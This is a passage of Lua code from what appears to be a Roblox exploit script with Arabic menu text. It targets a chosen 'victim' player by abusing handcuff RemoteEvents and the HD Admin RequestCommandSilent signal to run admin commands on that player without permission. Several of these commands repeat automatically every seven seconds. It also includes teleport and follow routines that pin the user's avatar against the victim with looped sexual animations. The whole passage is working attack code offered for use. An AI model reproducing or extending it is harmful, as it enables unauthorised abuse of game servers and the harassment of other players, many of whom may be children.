            showNotification("❌ الضحية غير موجود أو ليس لها شخصية", nil, false)
            return 
        end
        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        if not targetHRP then 
            showNotification("❌ الضحية لا تملك HumanoidRootPart", nil, false)
            return 
        end
        local cuff = getRandomCuff()
        if not cuff then 
            showNotification("❌ لا توجد كلبشات في حوزتك", nil, false)
            return 
        end
        cuff.Parent = player.Character
        local remote
        for _, obj in ipairs(cuff:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                remote = obj
                break
            end
        end
        if remote then
            remote:FireServer(targetHRP)
            task.wait(0.25)
            if cuff and cuff.Parent == player.Character then
                cuff.Parent = player.Backpack
            end
        else
            showNotification("❌ لم يتم العثور على RemoteEvent في الكلبشة", nil, false)
        end
    end

    function executePullCuff()
        if not currentVictim then
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
            return
        end
        local targetName = currentVictim
        local keyWords = {"كلب", "cuff", "hand", "arrest", "كلبشه", "كلبشة"}
        local function isCuff(tool)
            local name = tool.Name:lower()
            for _, word in ipairs(keyWords) do
                if string.find(name, word:lower()) then
                    return true
                end
            end
            return false
        end
        local function getAllCuffs()
            local cuffs = {}
            for _, item in ipairs(player.Backpack:GetChildren()) do
                if item:IsA("Tool") and isCuff(item) then
                    table.insert(cuffs, item)
                end
            end
            if player.Character then
                for _, item in ipairs(player.Character:GetChildren()) do
                    if item:IsA("Tool") and isCuff(item) then
                        table.insert(cuffs, item)
                    end
                end
            end
            return cuffs
        end
        local function getRandomCuff()
            local cuffs = getAllCuffs()
            if #cuffs == 0 then return nil end
            return cuffs[math.random(1, #cuffs)]
        end
        local target = Players:FindFirstChild(targetName)
        if not target or not target.Character then 
            showNotification("❌ الضحية غير موجود أو ليس لها شخصية", nil, false)
            return 
        end
        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        if not targetHRP then 
            showNotification("❌ الضحية لا تملك HumanoidRootPart", nil, false)
            return 
        end
        local cuff = getRandomCuff()
        if not cuff then 
            showNotification("❌ لا توجد كلبشات في حوزتك", nil, false)
            return 
        end
        cuff.Parent = player.Character
        local remote
        for _, obj in ipairs(cuff:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                remote = obj
                break
            end
        end
        if remote then
            remote:FireServer(targetHRP)
            task.wait(0.5)
            remote:FireServer(targetHRP)
            task.wait(0.25)
            if cuff and cuff.Parent == player.Character then
                cuff.Parent = player.Backpack
            end
        else
            showNotification("❌ لم يتم العثور على RemoteEvent في الكلبشة", nil, false)
        end
    end

    function executeSuspendCuff()
        if not currentVictim then
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
            return
        end
        local targetName = currentVictim
        local keyWords = {"كلب", "cuff", "hand", "arrest", "كلبشه", "كلبشة"}
        local function isCuff(tool)
            local name = tool.Name:lower()
            for _, word in ipairs(keyWords) do
                if string.find(name, word:lower()) then
                    return true
                end
            end
            return false
        end
        local function getAllCuffs()
            local cuffs = {}
            for _, item in ipairs(player.Backpack:GetChildren()) do
                if item:IsA("Tool") and isCuff(item) then
                    table.insert(cuffs, item)
                end
            end
            if player.Character then
                for _, item in ipairs(player.Character:GetChildren()) do
                    if item:IsA("Tool") and isCuff(item) then
                        table.insert(cuffs, item)
                    end
                end
            end
            return cuffs
        end
        local function getRandomCuff()
            local cuffs = getAllCuffs()
            if #cuffs == 0 then return nil end
            return cuffs[math.random(1, #cuffs)]
        end
        local target = Players:FindFirstChild(targetName)
        if not target or not target.Character then 
            showNotification("❌ الضحية غير موجود أو ليس لها شخصية", nil, false)
            return 
        end
        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        if not targetHRP then 
            showNotification("يا الضحيه شاري يا حمايه يا الضحيه متعلقه", nil, false)
            return 
        end
        local cuff = getRandomCuff()
        if not cuff then 
            showNotification("لا تمتلك كلبشه", nil, false)
            return 
        end
        cuff.Parent = player.Character
        local remote
        for _, obj in ipairs(cuff:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                remote = obj
                break
            end
        end
        if remote then
            remote:FireServer(targetHRP)
            task.wait(0.25)
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local RequestCommandSilent = ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
            if RequestCommandSilent then
                RequestCommandSilent:InvokeServer(".char ")
            end
            task.wait(0.25)
            if RequestCommandSilent then
                RequestCommandSilent:InvokeServer(".unchar ")
            end
            task.wait(0.25)
            if cuff and cuff.Parent == player.Character then
                cuff.Parent = player.Backpack
            end
        else
            showNotification("❌ لم يتم العثور على RemoteEvent في الكلبشة", nil, false)
        end
    end

    -- أداة تحديد الضحية
    function createVictimSelectTool()
        local tool = Instance.new("Tool")
        tool.Name = "اداه تحديد ضحيه"
        tool.RequiresHandle = false
        tool.CanBeDropped = false
        local textureId = "77081644892360"
        tool.TextureId = "rbxassetid://" .. textureId
        tool.Activated:Connect(function()
            local mouse = player:GetMouse()
            local target = mouse.Target
            if target then
                local character = target:FindFirstAncestorOfClass("Model")
                if character and character:FindFirstChildOfClass("Humanoid") then
                    for _, otherPlayer in pairs(Players:GetPlayers()) do
                        if otherPlayer.Character == character then
                            local isProtected = false
                            for _, protectedName in ipairs(protectedUsernames) do
                                if otherPlayer.Name:lower() == protectedName:lower() then
                                    isProtected = true
                                    break
                                end
                            end
                            if isProtected then
                                -- إظهار الإشعار الجديد
                                showNotification("هذا المستخدم محمي من صاحب سكربت !!", nil, false)
                                return
                            end
                            updateVictimInfo(otherPlayer)
                            return
                        end
                    end
                end
            end
        end)
        return tool
    end

    function addVictimSelectTool()
        local tool = createVictimSelectTool()
        local backpack = player:FindFirstChildOfClass("Backpack")
        if backpack then
            tool.Parent = backpack
        end
        player.CharacterAdded:Connect(function()
            task.wait(1)
            local newTool = createVictimSelectTool()
            local newBackpack = player:FindFirstChildOfClass("Backpack")
            if newBackpack then
                newTool.Parent = newBackpack
            end
        end)
    end
    coroutine.wrap(addVictimSelectTool)()

    -- وظائف تنفيذ الأوامر
    function executeSuspendFlyCommand()
        if currentVictim then
            executeCommand(".fly " .. currentVictim .. " 10. ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeUnsuspendFlyCommand()
        if currentVictim then
            executeCommand(".fly " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executePhaseCommand()
        if currentVictim then
            executeCommand(".phase " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeCharCommand()
        if currentVictim then
            executeCommand(".char " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeUncharCommand()
        if currentVictim then
            executeCommand(".unchar " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeUndogCommand()
        if currentVictim then
            executeCommand(".undog " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeUnneonCommand()
        if currentVictim then
            executeCommand(".unneon " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeUnwormifyCommand()
        if currentVictim then
            executeCommand(".unwormify " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeVictimCommand(command)
        if currentVictim then
            executeCommand(command .. " " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeColorCommand(color)
        if currentVictim then
            executeCommand(".colour " .. currentVictim .. " " .. color .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeFlyCommand(speed)
        if currentVictim then
            executeCommand(".fly " .. currentVictim .. " " .. speed .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeSpeedCommand(speed)
        if currentVictim then
            executeCommand(".speed " .. currentVictim .. " " .. speed .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeSizeCommand(size)
        if currentVictim then
            executeCommand(".size " .. currentVictim .. " " .. size .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeCharSkinCommand(char)
        if currentVictim then
            executeCommand(".char " .. currentVictim .. " " .. char .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeWhiteCommand()
        if currentVictim then
            executeCommand(".color " .. currentVictim .. " White ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeSuspendFCommand()
        if currentVictim then
            executeCommand(".speed " .. currentVictim .. " 01. .jp " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeUnsuspendFCommand()
        if currentVictim then
            executeCommand(".speed " .. currentVictim .. "  .unjp " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeSuspendJumpCommand()
        if currentVictim then
            executeCommand(".jp  " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeUnsuspendJumpCommand()
        if currentVictim then
            executeCommand(".unjp  " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeFlyInAirCommand()
        if currentVictim then
            executeCommand(".jp " .. currentVictim .. " 999999999999999999999999999999 .jump " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeStopAllCommand()
        if currentVictim then
            executeCommand(".unwormify " .. currentVictim .. "  .undog " .. currentVictim .. "  .unneon " .. currentVictim .. "  .unchar " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function executeCrippleCommand()
        if currentVictim then
            executeCommand(".sit  " .. currentVictim .. " ")
        else
            showNotification("❌ لم يتم تحديد ضحية", nil, false)
        end
    end

    function toggleAutoButton(buttonType, commandFunction, interval)
        if autoButtonsActive[buttonType] then
            autoButtonsActive[buttonType] = false
            if autoButtonsThreads[buttonType] then
                autoButtonsThreads[buttonType] = nil
            end
            if buttonInstances[buttonType] then
                buttonInstances[buttonType].Text = originalButtonNames[buttonType] .. " (إيقاف)"
                buttonInstances[buttonType].BackgroundColor3 = Color3.new(0, 0, 0)
            end
        else
            autoButtonsActive[buttonType] = true
            if buttonInstances[buttonType] then
                buttonInstances[buttonType].Text = originalButtonNames[buttonType] .. " (تشغيل)"
                buttonInstances[buttonType].BackgroundColor3 = Color3.new(0.5, 0, 0)
            end
            autoButtonsThreads[buttonType] = coroutine.wrap(function()
                while autoButtonsActive[buttonType] and currentVictim do
                    commandFunction()
                    task.wait(7)
                end
            end)()
        end
    end

    function toggleSpectate()
        if currentVictim and not isSpectating then
            local victimPlayer = findPlayerByPartialName(currentVictim)
            if victimPlayer and victimPlayer.Character then
                originalCameraSubject = workspace.CurrentCamera.CameraSubject
                workspace.CurrentCamera.CameraSubject = victimPlayer.Character:FindFirstChild("Humanoid")
                isSpectating = true
                buttonInstances["spectate"].Text = "إلغاء المشاهدة"
                buttonInstances["spectate"].BackgroundColor3 = Color3.new(0.5, 0, 0)
            end
        else
            workspace.CurrentCamera.CameraSubject = originalCameraSubject
            isSpectating = false
            buttonInstances["spectate"].Text = "مشاهدة"
            buttonInstances["spectate"].BackgroundColor3 = Color3.new(0, 0, 0)
        end
    end

    function teleportToPlayer()
        if currentVictim then
            local victimPlayer = findPlayerByPartialName(currentVictim)
            if victimPlayer and victimPlayer.Character then
                local humanoid = victimPlayer.Character:FindFirstChild("Humanoid")
                local rootPart = victimPlayer.Character:FindFirstChild("HumanoidRootPart")
                if humanoid and rootPart then
                    local localChar = player.Character
                    if localChar then
                        local localRoot = localChar:FindFirstChild("HumanoidRootPart")
                        if localRoot then
                            localRoot.CFrame = rootPart.CFrame + Vector3.new(0, 3, 0)
                        end
                    end
                end
            end
        end
    end

    function playBangAnimation()
        local character = player.Character
        if not character then return nil end
        local humanoid = character:FindFirstChild("Humanoid")
        if not humanoid then return nil end
        for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
            track:Stop()
        end
        local animation = Instance.new("Animation")
        animation.AnimationId = "rbxassetid://10714068222"
        local animTrack = humanoid:LoadAnimation(animation)
        animTrack.Looped = true
        animTrack:Play()
        animTrack:AdjustSpeed(2000)
        return animTrack
    end

    function startBang()
        if not currentVictim then return end
        local targetPlayer = findPlayerByPartialName(currentVictim)
        if not targetPlayer then return end
        bangActive = true
        bangTargetPlayer = targetPlayer
        local currentAnimTrack = playBangAnimation()
        bangConnection = RunService.Heartbeat:Connect(function()
            if bangActive and bangTargetPlayer and bangTargetPlayer.Character then
                local targetHRP = bangTargetPlayer.Character:FindFirstChild("HumanoidRootPart")
                local playerHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP and playerHRP then
                    local distance = 1
                    playerHRP.CFrame = CFrame.new(targetHRP.Position + targetHRP.CFrame.LookVector * -distance, targetHRP.Position)
                end
                if not currentAnimTrack or not currentAnimTrack.IsPlaying then
                    currentAnimTrack = playBangAnimation()
                end
            end
        end)
        buttonInstances["bang"].Text = "بانق (تشغيل)"
        buttonInstances["bang"].BackgroundColor3 = Color3.new(0.5, 0, 0)
    end

    function stopBang()
        bangActive = false
        bangTargetPlayer = nil
        if bangConnection then
            bangConnection:Disconnect()
            bangConnection = nil
        end
        local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
        if humanoid then
            for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
                track:Stop()
            end
        end
        buttonInstances["bang"].Text = "بانق (إيقاف)"
        buttonInstances["bang"].BackgroundColor3 = Color3.new(0, 0, 0)
    end

    function toggleBang()
        if bangActive then
            stopBang()
        else
            startBang()
        end
    end

    bangFrontFollowing = false
    bangFrontCurrentAnimTrack = nil

    function playBangFrontAnimation()
        local character = player.Character
        if not character then return nil end
        local humanoid = character:FindFirstChild("Humanoid")
        if not humanoid then return nil end
        for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
            track:Stop()
        end
        local animation = Instance.new("Animation")
        animation.AnimationId = "rbxassetid://10714068222"
        local ok, animTrack = pcall(function()
            return humanoid:LoadAnimation(animation)
        end)
        if not ok or not animTrack then return nil end
        animTrack.Looped = true
        animTrack:Play()
        pcall(function() animTrack:AdjustSpeed(2000) end)
        return animTrack
    end

    function applyBangFrontFollowStep(targetHRP, playerHRP)
        local forward = targetHRP.CFrame.LookVector
        local newPos = targetHRP.Position + forward * 1
        playerHRP.CFrame = CFrame.new(newPos, targetHRP.Position)
    end

    function startBangFront()
        if not currentVictim then return end
        local targetPlayer = findPlayerByPartialName(currentVictim)
        if not targetPlayer then return end
        bangFrontTargetPlayer = targetPlayer
        bangFrontFollowing = true
        local currentAnimTrack = playBangFrontAnimation()
        bangFrontCurrentAnimTrack = currentAnimTrack
        if bangFrontConnection then
            bangFrontConnection:Disconnect()
            bangFrontConnection = nil
        end
        bangFrontConnection = RunService.Heartbeat:Connect(function()
            if bangFrontFollowing and bangFrontTargetPlayer and bangFrontTargetPlayer.Character then
                local targetHRP = bangFrontTargetPlayer.Character:FindFirstChild("HumanoidRootPart")
                local playerHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP and playerHRP then
                    applyBangFrontFollowStep(targetHRP, playerHRP)
                end
                if not currentAnimTrack or not currentAnimTrack.IsPlaying then
                    currentAnimTrack = playBangFrontAnimation()
                    bangFrontCurrentAnimTrack = currentAnimTrack
                end
            end
        end)
        buttonInstances["bangFront"].Text = "بانق من الامام (تشغيل)"
        buttonInstances["bangFront"].BackgroundColor3 = Color3.new(0.5, 0, 0)
    end

    function stopBangFront()
        bangFrontFollowing = false
        bangFrontTargetPlayer = nil
        if bangFrontConnection then
            bangFrontConnection:Disconnect()
            bangFrontConnection = nil
        end
        if bangFrontCurrentAnimTrack then
            bangFrontCurrentAnimTrack:Stop()
            bangFrontCurrentAnimTrack = nil
        end
        buttonInstances["bangFront"].Text = "بانق من الامام (إيقاف)"
        buttonInstances["bangFront"].BackgroundColor3 = Color3.new(0, 0, 0)
    end

    function toggleBangFront()
        if bangFrontFollowing then
            stopBangFront()
        else
            startBangFront()
        end
    end

    function updateHeadSuck()
        while headSucking do
            local localChar = game.Players.LocalPlayer.Character
            if not localChar then
                game:GetService("RunService").Heartbeat:Wait()
            else
            local humanoid = localChar:FindFirstChildOfClass("Humanoid")
            if humanoid and headSucking then
                humanoid.Sit = true
                if not headSuckAnimTrack then
                    local animation = Instance.new("Animation")
                    animation.AnimationId = "rbxassetid://2506281703"
                    headSuckAnimTrack = humanoid:LoadAnimation(animation)
                    headSuckAnimTrack:Play()
                    headSuckAnimTrack:AdjustSpeed(1.5)
                end
            end
            if headSuckTargetPlayer and headSuckTargetPlayer.Character then
                local humanoidRootPart = localChar:FindFirstChild("HumanoidRootPart")
                local targetHead = headSuckTargetPlayer.Character:FindFirstChild("Head")
                if humanoidRootPart and targetHead then
                    if headSuckMovingIn then
                        headSuckCurrentDistance = headSuckCurrentDistance - headSuckMovementSpeed
                        if headSuckCurrentDistance <= headSuckMinDistance then 
                            headSuckMovingIn = false 
                        end
                    else
                        headSuckCurrentDistance = headSuckCurrentDistance + headSuckMovementSpeed
                        if headSuckCurrentDistance >= headSuckMaxDistance then 
                            headSuckMovingIn = true 
                        end
                    end
                    local faceDirection = targetHead.CFrame.LookVector
                    local targetPosition = targetHead.Position + (faceDirection * headSuckCurrentDistance)
                    targetPosition = Vector3.new(targetPosition.X, targetHead.Position.Y, targetPosition.Z)
                    humanoidRootPart.CFrame = CFrame.new(targetPosition, targetHead.Position)
                    humanoidRootPart.Velocity = Vector3.new(0, 2, 0)
                end
            end
            game:GetService("RunService").Heartbeat:Wait()
        end
            end
        local localChar = game.Players.LocalPlayer.Character
        if localChar then
            local humanoid = localChar:FindFirstChildOfClass("Humanoid")
            if humanoid then 
                humanoid.Sit = false 
            end
        end
        if headSuckAnimTrack then 
            headSuckAnimTrack:Stop() 
            headSuckAnimTrack = nil 
        end
    end

    function startHeadSuck(target)
        headSuckTargetPlayer = target
        headSucking = true
        spawn(updateHeadSuck)
        buttonInstances["headSuck"].Text = "بانق بالراس (تشغيل)"
        buttonInstances["headSuck"].BackgroundColor3 = Color3.new(0.5, 0, 0)
    end

    function stopHeadSuck()
        headSucking = false
        headSuckTargetPlayer = nil
        buttonInstances["headSuck"].Text = "بانق بالراس (إيقاف)"
        buttonInstances["headSuck"].BackgroundColor3 = Color3.new(0, 0, 0)
    end

    function toggleHeadSuck()
        if headSucking then
            stopHeadSuck()
        else
            if currentVictim then
                local targetPlayer = findPlayerByPartialName(currentVictim)
                if targetPlayer then
                    startHeadSuck(targetPlayer)
                end
            end
        end
    end

    -- الزرين الجديدين
    backpackSitActive = false
    backpackSitConnection = nil
    headSitActive = false
    headSitConnection = nil
    headSitVelocity = nil

    function toggleBackpackSit()
        if backpackSitActive then
            backpackSitActive = false
            if backpackSitConnection then
                backpackSitConnection:Disconnect()
                backpackSitConnection = nil
            end
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Sit = false
            end
            buttonInstances["backpackSit"].Text = "حقيبه في الظهر (إيقاف)"
            buttonInstances["backpackSit"].BackgroundColor3 = Color3.new(0, 0, 0)
        else
            if not currentVictim then
                showNotification("❌ لم يتم تحديد ضحية", nil, false)
                return
            end
            local targetPlayer = Players:FindFirstChild(currentVictim)
            if not targetPlayer then
                showNotification("❌ الضحية غير موجود", nil, false)
                return
            end
            backpackSitActive = true
            buttonInstances["backpackSit"].Text = "حقيبه في الظهر (تشغيل)"
            buttonInstances["backpackSit"].BackgroundColor3 = Color3.new(0.5, 0, 0)
            backpackSitConnection = RunService.Heartbeat:Connect(function()
                if backpackSitActive and targetPlayer and targetPlayer.Character and player.Character then
                    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local playerRoot = player.Character:FindFirstChild("HumanoidRootPart")
                    local playerHumanoid = player.Character:FindFirstChild("Humanoid")
                    if targetRoot and playerRoot and playerHumanoid then
                        playerHumanoid.Sit = true
                        playerRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 1.2) * CFrame.Angles(0, math.rad(180), 0)
                        playerRoot.Velocity = Vector3.new(0, 0, 0)
                    end
                end
            end)
        end
    end

    function toggleHeadSit()
        if headSitActive then
            headSitActive = false
            if headSitConnection then
                headSitConnection:Disconnect()
                headSitConnection = nil
            end
            if headSitVelocity then
                headSitVelocity:Destroy()
                headSitVelocity = nil
            end
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Sit = false
            end
            buttonInstances["headSit"].Text = "جلوس على الراس (إيقاف)"
            buttonInstances["headSit"].BackgroundColor3 = Color3.new(0, 0, 0)
        else
            if not currentVictim then
                showNotification("❌ لم يتم تحديد ضحية", nil, false)
                return
            end
            local targetPlayer = Players:FindFirstChild(currentVictim)
            if not targetPlayer then
                showNotification("❌ الضحية غير موجود", nil, false)
                return
            end
            headSitActive = true
            buttonInstances["headSit"].Text = "جلوس على الراس (تشغيل)"
            buttonInstances["headSit"].BackgroundColor3 = Color3.new(0.5, 0, 0)
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local root = player.Character.HumanoidRootPart
                if not root:FindFirstChild("BreakVelocity") then
                    headSitVelocity = Instance.new("BodyVelocity")
                    headSitVelocity.Name = "BreakVelocity"
                    headSitVelocity.MaxForce = Vector3.new(40000, 40000, 40000)
                    headSitVelocity.Velocity = Vector3.new(0, 0, 0)
                    headSitVelocity.Parent = root
                end
            end
            headSitConnection = RunService.Heartbeat:Connect(function()
                if headSitActive and targetPlayer and targetPlayer.Character and player.Character then
                    local targetHead = targetPlayer.Character:FindFirstChild("Head")
                    local playerRoot = player.Character:FindFirstChild("HumanoidRootPart")
                    local playerHumanoid = player.Character:FindFirstChild("Humanoid")
                    if targetHead and playerRoot and playerHumanoid then
                        playerHumanoid.Sit = true
                        playerRoot.CFrame = targetHead.CFrame * CFrame.new(0, 2, 0)
                        playerRoot.Velocity = Vector3.new(0, 0, 0)
                    end
                end
            end)
        end
    end

    -- إعادة التفعيل التلقائي
    function restartActiveEffects()
        if bangWasActive and currentVictim then
            startBang()
        end
        if bangFrontWasActive and currentVictim then
            startBangFront()
        end
        if headSuckWasActive and currentVictim then
            local targetPlayer = findPlayerByPartialName(currentVictim)
            if targetPlayer then
                startHeadSuck(targetPlayer)
            end
        end
        for buttonType, wasActive in pairs(autoButtonsWasActive) do
            if wasActive and not autoButtonsActive[buttonType] then
                if buttonInstances[buttonType] then
                    buttonInstances[buttonType]:MouseButton1Click()
                end
            end
        end
    end

    player.CharacterAdded:Connect(function()
        task.wait(1)
        if bangActive then
            playBangAnimation()
        end
        if bangFrontFollowing then
            playBangFrontAnimation()
        end
        if headSucking then
            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://2506281703"
            headSuckAnimTrack = player.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(animation)
            headSuckAnimTrack:Play()
            headSuckAnimTrack:AdjustSpeed(1.5)
        end
    end)

    -- نظام التبديل بين الأقسام
    function showSection(sectionName)
        VictimSection.Visible = (sectionName == "الضحيه")
        FeaturesSection.Visible = (sectionName == "المميزات")
        VictimTab.BackgroundColor3 = (sectionName == "الضحيه") and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.1, 0.1, 0.1)
        FeaturesTab.BackgroundColor3 = (sectionName == "المميزات") and Color3.new(0.2, 0.2, 0.2) or Color3.new(0.1, 0.1, 0.1)
    end

    function toggleMainGUI()
        if MainFrame.Visible then
            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = TweenService:Create(MainFrame, tweenInfo, {
                Size = UDim2.new(0, 0, 0, 0),
                Position = UDim2.new(0.5, 0, 0.5, 0),
                BackgroundTransparency = 1,
                BorderSizePixel = 0
            })
            tween:Play()
            task.wait(0.3)
            MainFrame.Visible = false
        else
            MainFrame.Visible = true
            MainFrame.Size = UDim2.new(0, 0, 0, 0)
            MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
            MainFrame.BackgroundTransparency = 1
            MainFrame.BorderSizePixel = 0
            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            local tween = TweenService:Create(MainFrame, tweenInfo, {
                Size = UDim2.new(0, 500, 0, 350),
                Position = UDim2.new(0.5, -250, 0.5, -175),
                BackgroundTransparency = 0.5,
                BorderSizePixel = 3
            })
            tween:Play()
        end
    end

    function showToggleButton()
        task.wait(7)
        ToggleButton.Visible = true
        ToggleButton.Size = UDim2.new(0, 35, 0, 35)
        ToggleButton.Position = UDim2.new(0, 20, 0, 20)
        ToggleButton.BackgroundTransparency = 0.5
        ToggleButton.TextTransparency = 0
    end
    coroutine.wrap(showToggleButton)()

    ToggleButton.MouseButton1Click:Connect(toggleMainGUI)

    VictimTab.MouseButton1Click:Connect(function() showSection("الضحيه") end)
    FeaturesTab.MouseButton1Click:Connect(function() showSection("المميزات") end)

    SetVictimButton.MouseButton1Click:Connect(function()
        local username = VictimInput.Text
        if username ~= "" then
            if #username >= 3 then
                local isProtected = false
                for _, protectedName in ipairs(protectedUsernames) do
                    if username:lower() == protectedName:lower() then
                        isProtected = true
                        break
                    end
                end
                if isProtected then
                    showNotification("هذا المستخدم محمي من صاحب سكربت !!", nil, false) -- تغيير النص
                    return
                end
                local victimPlayer = findPlayerByPartialName(username)
                if victimPlayer then
                    local victimUsername = victimPlayer.Name:lower()
                    for _, protectedName in ipairs(protectedUsernames) do
                        if victimUsername == protectedName:lower() then
                            showNotification("هذا المستخدم محمي من صاحب سكربت !!", nil, false) -- تغيير النص
                            return
                        end
                    end
                    updateVictimInfo(victimPlayer)
                    VictimInput.Text = ""
                else
                    showNotification("❌ لم يتم العثور على اللاعب: " .. username, nil, false)
                end
            else
                showNotification("❌ أدخل 3 أحرف على الأقل", nil, false)
            end
        else
            showNotification("❌ أدخل اسم المستخدم", nil, false)
        end
    end)

    -- توصيل أزرار الضحية
    buttonInstances["spectate"].MouseButton1Click:Connect(toggleSpectate)
    buttonInstances["teleport"].MouseButton1Click:Connect(teleportToPlayer)
    buttonInstances["reset"].MouseButton1Click:Connect(function() executeVictimCommand(".re") end)
    buttonInstances["to"].MouseButton1Click:Connect(function() executeVictimCommand(".to") end)
    buttonInstances["bang"].MouseButton1Click:Connect(toggleBang)
    buttonInstances["bangFront"].MouseButton1Click:Connect(toggleBangFront)
    buttonInstances["headSuck"].MouseButton1Click:Connect(toggleHeadSuck)
    buttonInstances["fling"].MouseButton1Click:Connect(executeFling)
    buttonInstances["freezeCuff"].MouseButton1Click:Connect(executeFreezeCuff)
    buttonInstances["pullCuff"].MouseButton1Click:Connect(executePullCuff)
    buttonInstances["suspendCuff"].MouseButton1Click:Connect(executeSuspendCuff)
    buttonInstances["backpackSit"].MouseButton1Click:Connect(toggleBackpackSit)
    buttonInstances["headSit"].MouseButton1Click:Connect(toggleHeadSit)
    buttonInstances["autoReset"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoReset", function() executeVictimCommand(".re") end, 7)
    end)
    buttonInstances["stopAll"].MouseButton1Click:Connect(executeStopAllCommand)
    buttonInstances["autoStopAll"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoStopAll", executeStopAllCommand, 7)
    end)
    buttonInstances["cripple"].MouseButton1Click:Connect(executeCrippleCommand)
    buttonInstances["autoCripple"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoCripple", executeCrippleCommand, 7)
    end)
    buttonInstances["flyInAir"].MouseButton1Click:Connect(executeFlyInAirCommand)
    buttonInstances["autoFlyInAir"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoFlyInAir", executeFlyInAirCommand, 7)
    end)
    buttonInstances["suspendF"].MouseButton1Click:Connect(executeSuspendFCommand)
    buttonInstances["unsuspendF"].MouseButton1Click:Connect(executeUnsuspendFCommand)
    buttonInstances["autoSuspendF"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoSuspendF", executeSuspendFCommand, 7)
    end)
    buttonInstances["suspendJump"].MouseButton1Click:Connect(executeSuspendJumpCommand)
    buttonInstances["unsuspendJump"].MouseButton1Click:Connect(executeUnsuspendJumpCommand)
    buttonInstances["autoJump"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoJump", function() executeVictimCommand(".jump") end, 7)
    end)
    buttonInstances["suspendFly"].MouseButton1Click:Connect(executeSuspendFlyCommand)
    buttonInstances["unsuspendFly"].MouseButton1Click:Connect(executeUnsuspendFlyCommand)
    buttonInstances["autoSuspendFly"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoSuspendFly", function()
            if currentVictim then
                executeCommand(".fly " .. currentVictim .. " 10. ")
            end
        end, 7)
    end)
    buttonInstances["unfly"].MouseButton1Click:Connect(function() executeVictimCommand(".unfly") end)
    buttonInstances["dog"].MouseButton1Click:Connect(function() executeVictimCommand(".dog") end)
    buttonInstances["autoDog"].MouseButton1Click:Connect(function()
        toggleAutoButton("autoDog", function() executeVictimCommand(".dog") end, 7)
    end)
    buttonInstances["worm"].MouseButton1Click:Connect(function() executeVictimCommand(".worm") end)
    buttonInstances["size3"].MouseButton1Click:Connect(function() executeSizeCommand("3") end)
    buttonInstances["charMiri"].MouseButton1Click:Connect(function() executeCharSkinCommand("miri") end)
    buttonInstances["giantDwarf"].MouseButton1Click:Connect(function() executeVictimCommand(".giantDwarf") end)
